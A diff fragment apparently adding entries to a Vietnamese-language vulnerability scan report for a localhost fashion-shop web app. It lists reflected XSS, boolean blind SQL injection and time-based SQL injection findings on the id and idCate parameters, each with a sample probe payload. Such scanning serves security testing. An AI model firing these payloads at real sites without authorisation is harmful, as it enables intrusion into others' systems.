+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=3</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=6</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=8</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code> AND (SELECT 5 FROM PG_SLEEP(5))</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=13</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code> AND (SELECT 5 FROM PG_SLEEP(5))</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=2&amp;id=11</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=3&amp;id=19</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=26</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=1&amp;id=9</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=27</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Blind SQLi (Boolean)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND &#x27;1&#x27;=&#x27;1</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=7&amp;id=28</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;--</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=31</p>
+    <p><b>Tham số:</b> id (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; onmouseover=&#x27;alert(1)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>Reflected XSS</h3>
+    <p><b>URL:</b> http://localhost/qlthoitrang/?frame=chitietsp&amp;idCate=8&amp;id=30</p>
+    <p><b>Tham số:</b> idCate (GET)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
